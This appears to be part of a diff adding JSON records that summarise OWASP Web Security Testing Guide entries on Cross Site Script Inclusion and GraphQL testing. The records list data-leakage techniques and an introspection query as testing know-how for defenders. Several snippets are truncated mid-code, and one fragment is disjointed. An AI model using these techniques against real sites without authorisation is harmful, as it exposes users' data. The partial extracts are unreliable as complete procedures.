+        "List All Entries on the Window Object: (() => { // create an iframe and append to body to load a clean window object const iframe = document.createElement('iframe'); iframe.style.display = 'none'; document.body.appendChild(iframe); // get the current list of properties on window const currentWindow "
+      ],
+      "tools": [
+        "Google"
+      ],
+      "pages": "418-421"
+    },
+    {
+      "id": "WSTG-CLNT-13",
+      "name": "Testing for Cross Site Script Inclusion",
+      "category": "CLNT",
+      "objective": "Locate sensitive data across the system. Assess the leakage of sensitive data through various techniques.",
+      "how_to_test": [
+        "Global variables",
+        "Global function parameters",
+        "CSV (Comma Separated Values) with quotations theft",
+        "JavaScript runtime errors",
+        "Sensitive Data Leakage via Global Variables",
+        "Sensitive Data Leakage via Global Function Parameters",
+        "Sensitive Data Leakage via CSV with Quotations Theft",
+        "Sensitive Data Leakage via JavaScript Runtime Errors"
+      ],
+      "tools": [
+        "Burp"
+      ],
+      "pages": "422-427"
+    },
+    {
+      "id": "WSTG-APIT-01",
+      "name": "Testing GraphQL",
+      "category": "APIT",
+      "objective": "Assess that a secure and production-ready conﬁguration is deployed. Validate all input ﬁelds against generic attacks. Ensure that proper access controls are applied.",
+      "how_to_test": [
+        "Introspection Queries: Introspection queries are the method by which GraphQL lets you ask what queries are supported, which data types are available, and many more details you will need when approaching a test of a GraphQL deployment.",
+        "The GraphQL website describes Introspection: “It’s often useful to ask a GraphQL schema for information about what queries it supports.",
+        "Using Native GraphQL Introspection: The most straightforward way is to send an HTTP request (using a personal proxy) with the following payload, taken from an article on Medium: query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullTy",
+        "ID: name veterinary (ID) There is one downside to using this method: GraphQL Voyager does not display everything that can be done with GraphQL.",
+        "Using GraphiQL: GraphiQL is a web-based IDE for GraphQL.",
+        "Using GraphQL Playground: GraphQL Playground is a GraphQL client."
+      ],
+      "tools": [
+        "GraphiQL",
+        "GraphQL Voyager"
+      ],
+      "pages": "428-432"
+    }
+  ]
+}
